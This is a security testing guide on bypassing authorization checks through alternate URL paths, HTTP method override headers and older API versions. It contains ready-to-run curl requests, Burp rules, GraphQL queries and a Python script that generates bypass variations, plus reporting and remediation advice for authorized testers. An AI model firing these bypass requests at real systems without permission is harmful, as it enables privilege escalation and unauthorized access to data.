# Authorization Bypass Through Alternate Endpoints, Methods, or API Versions

## Overview

Authorization bypass occurs when an application enforces access controls on primary endpoints but fails to apply the same controls on alternate paths that reach the same functionality. Attackers exploit inconsistencies in how different endpoints, HTTP methods, or API versions handle authorization to access resources or perform actions they should not be permitted to.

**Severity:** Typically High to Critical (CVSS 7.0–10.0)
**CWE:** CWE-285 (Improper Authorization), CWE-863 (Incorrect Authorization)
**OWASP:** API1:2023 Broken Object Level Authorization, API5:2023 Broken Function Level Authorization

---

## Attack Surface Areas

### 1. Alternate Endpoint Patterns

Applications frequently expose the same resource through multiple URL patterns. Authorization may be enforced on one but not another.

#### Common Bypass Patterns

| Primary Endpoint (Protected) | Alternate Endpoint (Test For Bypass) |
|------------------------------|--------------------------------------|
| `/api/v2/admin/users` | `/api/v1/admin/users` |
| `/api/users/123` | `/api/users/123.json` |
| `/admin/dashboard` | `/ADMIN/dashboard` (case variation) |
| `/api/users/123` | `/api/users/123/` (trailing slash) |
| `/api/v1/users` | `/api/v1/users;.js` (path parameter injection) |
| `/api/users/delete` | `/api/internal/users/delete` |
| `/graphql` (query) | `/graphql` (mutation with same data) |
| `/api/users` | `/%61%70%69/users` (URL-encoded path) |
| `/api/admin/config` | `/api/admin/./config` (dot-segment) |
| `/api/v2/account` | `/api/v2/account%00` (null byte) |

#### Endpoint Discovery Checklist

- [ ] Enumerate all API versions (v1, v2, v3, beta, alpha, internal, legacy, staging)
- [ ] Check for path normalization issues (double slashes, dot-segments, trailing slashes)
- [ ] Test URL encoding and double encoding of path segments
- [ ] Identify undocumented endpoints via JS file analysis, API docs, or wordlists
- [ ] Check for alternate file extensions (.json, .xml, .yaml, .html, .php)
- [ ] Look for internal/debug/admin path prefixes
- [ ] Test case sensitivity variations on path segments
- [ ] Check for GraphQL alias queries that bypass per-field authorization
- [ ] Test REST-to-GraphQL or REST-to-gRPC alternate paths
- [ ] Examine mobile API endpoints vs web API endpoints

### 2. HTTP Method Tampering

Authorization middleware or server configuration may only check specific HTTP methods, leaving others unprotected.

#### Method Bypass Matrix

| Intended Method | Alternate Methods to Test |
|-----------------|--------------------------|
| GET | HEAD, OPTIONS, POST, PUT, PATCH |
| POST | PUT, PATCH, GET (query string params) |
| DELETE | POST with `_method=DELETE`, `X-HTTP-Method-Override: DELETE` |
| PUT | PATCH, POST with `X-HTTP-Method: PUT` |
| Any | TRACE, CONNECT, PROPFIND, MOVE, COPY |

#### Method Override Headers

Test each of these headers with alternate method values:

```
X-HTTP-Method-Override: DELETE
X-HTTP-Method: PUT
X-Method-Override: PATCH
X-Original-Method: DELETE
Override-Method: PUT
Method-Override: DELETE
_method=DELETE (in POST body or query string)
```

### 3. API Version Rollback

Older API versions may lack security controls added in newer versions.

#### Version Testing Strategy

```
# If the application uses /api/v3/resource, test:
/api/v1/resource
/api/v2/resource
/api/v0/resource
/api/beta/resource
/api/alpha/resource
/api/latest/resource
/api/legacy/resource
/api/internal/resource
/api/staging/resource
/api/dev/resource
/api/test/resource
```

#### Version Specification via Headers

```
Accept: application/vnd.api+json; version=1
Api-Version: 1
X-Api-Version: 2021-01-01
Accept-Version: 1.0
API_VERSION: 1
```

---

## Testing Methodology

### Phase 1: Reconnaissance

1. **Map the API surface**
   - Crawl the application and capture all endpoints
   - Analyze JavaScript files for hidden endpoints and API calls
   - Review API documentation (Swagger/OpenAPI specs if available)
   - Check for sitemap.xml, robots.txt, and .well-known paths
   - Use Wayback Machine / GAU for historical endpoint discovery

2. **Identify authorization boundaries**
   - Document which endpoints require authentication
   - Document which endpoints enforce role-based access
   - Note the authorization mechanism (JWT, session cookies, API keys, OAuth tokens)
   - Identify which middleware or filters enforce access controls

3. **Catalog API versions**
   - Identify the current API version in use
   - Enumerate all historical and alternate versions
   - Check version negotiation mechanisms (URL path, headers, query params)

### Phase 2: Alternate Endpoint Testing

4. **Path manipulation tests**
   ```
   # Original protected endpoint
   GET /api/v2/admin/users  → 403 Forbidden

   # Path variation tests
   GET /api/v2/admin/users/        → ?
   GET /api/v2/admin/users/.       → ?
   GET /api/v2/admin//users        → ?
   GET /api/v2/admin/./users       → ?
   GET /Api/V2/Admin/Users         → ?
   GET /%61%70%69/v2/admin/users   → ?
   GET /api/v2/admin/users%00      → ?
   GET /api/v2/admin/users;.json   → ?
   GET /api/v2/admin/users.json    → ?
   GET /api/v2/admin/users#        → ?
   ```

5. **Version downgrade tests**
   ```
   # If v2 enforces authorization
   GET /api/v2/admin/users  → 403 Forbidden

   # Test older versions
   GET /api/v1/admin/users  → ?
   GET /api/v0/admin/users  → ?
   GET /api/admin/users      → ? (no version prefix)
   ```

6. **Extension and content-type variation**
   ```
   GET /api/v2/admin/users.json
   GET /api/v2/admin/users.xml
   GET /api/v2/admin/users.csv
   GET /api/v2/admin/users.yaml
   GET /api/v2/admin/users?format=json
   ```

### Phase 3: HTTP Method Tampering

7. **Method substitution**
   ```
   # If DELETE is protected
   DELETE /api/v2/users/123  → 403 Forbidden

   # Try method overrides
   POST /api/v2/users/123 -H "X-HTTP-Method-Override: DELETE"
   POST /api/v2/users/123 -d "_method=DELETE"
   GET /api/v2/users/123?_method=DELETE
   ```

8. **Wildcard method testing**
   ```
   # Test non-standard methods
   OPTIONS /api/v2/admin/users
   HEAD /api/v2/admin/users
   TRACE /api/v2/admin/users
   PATCH /api/v2/admin/users
   PROPFIND /api/v2/admin/users
   ```

### Phase 4: Cross-Boundary Testing

9. **Cross-service endpoint testing**
   ```
   # If web app uses /api/v2 with strict auth
   # Check if mobile API has weaker controls
   GET /mobile-api/v1/admin/users
   GET /m/api/users
   GET /app-api/users

   # Check internal/partner APIs
   GET /internal/api/users
   GET /partner/api/users
   GET /public/api/users
   ```

10. **GraphQL specific tests**
    ```graphql
    # If query is protected, try via alias or mutation
    query {
      user1: user(id: "admin-id") { email role }
    }

    # Introspection to find alternate query paths
    query {
      __schema { types { name fields { name } } }
    }

    # Batch queries to bypass rate-limited authorization
    query {
      a1: sensitiveData(id: "1") { secret }
      a2: sensitiveData(id: "2") { secret }
    }
    ```

---

## Sample Test Cases (Copy-Paste Ready)

### curl Commands

```bash
# Baseline: authenticated request to protected endpoint
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/api/v2/admin/users"

# Test 1: API version downgrade
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/api/v1/admin/users"

# Test 2: Trailing slash
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/api/v2/admin/users/"

# Test 3: Case variation
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/API/V2/ADMIN/USERS"

# Test 4: HTTP method override
curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  -H "X-HTTP-Method-Override: GET" \
  "https://target.com/api/v2/admin/users"

# Test 5: URL encoding
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/%61%70%69/v2/admin/users"

# Test 6: Double URL encoding
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/%2561%2570%2569/v2/admin/users"

# Test 7: Path traversal normalization
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/api/v2/public/../admin/users"

# Test 8: Semicolon path parameter
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/api/v2/admin/users;.css"

# Test 9: Version via header instead of path
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  -H "Api-Version: 1" \
  "https://target.com/api/admin/users"

# Test 10: No version at all
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  "https://target.com/api/admin/users"
```

### Burp Suite Match/Replace Rules

```
# Add these to Burp Proxy Match and Replace for passive testing:

# Rule 1: Version downgrade
Match: /api/v2/
Replace: /api/v1/

# Rule 2: Add method override header
Match: (empty)
Replace: X-HTTP-Method-Override: DELETE
Type: Request Header

# Rule 3: Trailing slash addition
Match: HTTP/1.1
Replace: / HTTP/1.1
Type: Request First Line (append before HTTP version)
```

---

## Automation Script

```python
#!/usr/bin/env python3
"""
Authorization Bypass Tester
Tests for authorization bypass via alternate endpoints, methods, and API versions.
For authorized security testing only.
"""

import sys
import urllib.parse

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "X-Original-Method",
]
VERSION_PATTERNS = ["v0", "v1", "v2", "v3", "beta", "alpha", "internal", "legacy"]


def generate_path_variations(path):
    """Generate path bypass variations for a given endpoint."""
    variations = [
        path + "/",
        path + "/.",
        path + "%00",
        path + ";.css",
        path + ";.js",
        path + ".json",
        path + ".xml",
        path + "?",
        path + "#",
        path + "%20",
    ]

    # Case variations
    variations.append(path.upper())
    variations.append(path.swapcase())

    # URL encode each segment
    parts = path.split("/")
    encoded_parts = [urllib.parse.quote(p, safe="") if p else p for p in parts]
    variations.append("/".join(encoded_parts))

    # Double URL encode
    double_encoded = [urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="") if p else p for p in parts]
    variations.append("/".join(double_encoded))

    # Path traversal normalization
    if len(parts) > 2:
        injected = parts[:-1] + [".."] + parts[-1:]
        variations.append("/".join(injected))

    # Double slash
    variations.append(path.replace("/", "//", 1))

    return variations


def generate_version_variations(path):
    """Replace detected API version with alternatives."""
    variations = []
    for pattern in VERSION_PATTERNS:
        for vp in VERSION_PATTERNS:
            if vp != pattern and ("/" + pattern + "/") in path:
                variations.append(path.replace("/" + pattern + "/", "/" + vp + "/"))
        # Also try removing version entirely
        if ("/" + pattern + "/") in path:
            variations.append(path.replace("/" + pattern + "/", "/"))
    return list(set(variations))


def generate_method_override_payloads(target_method):
    """Generate method override header combinations."""
    payloads = []
    for header in OVERRIDE_HEADERS:
        payloads.append({"method": "POST", "header": f"{header}: {target_method}"})
    payloads.append({"method": "POST", "body": f"_method={target_method}"})
    payloads.append({"method": "GET", "query": f"_method={target_method}"})
    return payloads


def print_test_plan(endpoint, method="GET"):
    """Print a complete test plan for a given endpoint."""
    print(f"\n{'='*70}")
    print(f"Authorization Bypass Test Plan")
    print(f"Target: {method} {endpoint}")
    print(f"{'='*70}")

    print(f"\n--- Path Variations ({len(generate_path_variations(endpoint))} tests) ---")
    for i, var in enumerate(generate_path_variations(endpoint), 1):
        print(f"  {i:3d}. {method} {var}")

    version_vars = generate_version_variations(endpoint)
    if version_vars:
        print(f"\n--- Version Variations ({len(version_vars)} tests) ---")
        for i, var in enumerate(version_vars, 1):
            print(f"  {i:3d}. {method} {var}")

    print(f"\n--- Method Variations ({len(METHODS) - 1} tests) ---")
    for m in METHODS:
        if m != method:
            print(f"  - {m} {endpoint}")

    overrides = generate_method_override_payloads(method)
    print(f"\n--- Method Override Tests ({len(overrides)} tests) ---")
    for o in overrides:
        if "header" in o:
            print(f"  - {o['method']} {endpoint}  Header: {o['header']}")
        elif "body" in o:
            print(f"  - {o['method']} {endpoint}  Body: {o['body']}")
        elif "query" in o:
            print(f"  - {o['method']} {endpoint}?{o['query']}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 auth_bypass_tester.py <endpoint> [method]")
        print("Example: python3 auth_bypass_tester.py /api/v2/admin/users GET")
        sys.exit(1)
    target = sys.argv[1]
    http_method = sys.argv[2] if len(sys.argv) > 2 else "GET"
    print_test_plan(target, http_method)
```

---

## Reporting Template

### Title
Authorization Bypass via [Alternate Endpoint / Method Override / API Version Downgrade] on [Resource]

### Description
The application enforces authorization on `[PROTECTED_ENDPOINT]` but fails to enforce the same controls when the resource is accessed via `[BYPASS_ENDPOINT/METHOD]`. This allows a user with `[LOW_PRIVILEGE_ROLE]` to `[ACTION]` on `[RESOURCE]` which should be restricted to `[REQUIRED_ROLE]`.

### Steps to Reproduce
1. Authenticate as a user with `[LOW_PRIVILEGE_ROLE]` and obtain a valid session/token
2. Send a request to the protected endpoint and confirm it returns 403:
   ```
   [ORIGINAL REQUEST] → 403 Forbidden
   ```
3. Send the same request via the alternate path:
   ```
   [BYPASS REQUEST] → 200 OK (with sensitive data)
   ```

### Impact
An attacker with a low-privileged account can escalate privileges to perform administrative actions, including [specific impact: reading all user data, modifying configurations, deleting resources, etc.].

### Remediation
- Implement authorization checks at the controller/handler level, not at the routing/middleware layer
- Use a centralized authorization framework that applies uniformly regardless of the request path
- Deprecate and remove old API versions or apply identical security controls
- Normalize request paths before authorization checks
- Reject or ignore HTTP method override headers in production

---

## Common Vulnerable Frameworks and Configurations

| Framework / Server | Common Misconfiguration |
|--------------------|------------------------|
| Spring Security | URL pattern matching with `antMatchers` doesn't cover all path variations |
| Express.js | Route-level middleware skipped on alternate paths |
| Django | `@permission_required` on view but not on alternate URL pattern |
| Nginx + Backend | Nginx location block auth doesn't match backend route normalization |
| Apache + Backend | `<Location>` auth bypassed via path encoding or traversal |
| AWS API Gateway | Authorizer attached to v2 stage but not v1 |
| Kong / Envoy | Plugin applied per-route, missing on alternate routes |

---

## References

- [OWASP API Security Top 10 - API5:2023 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
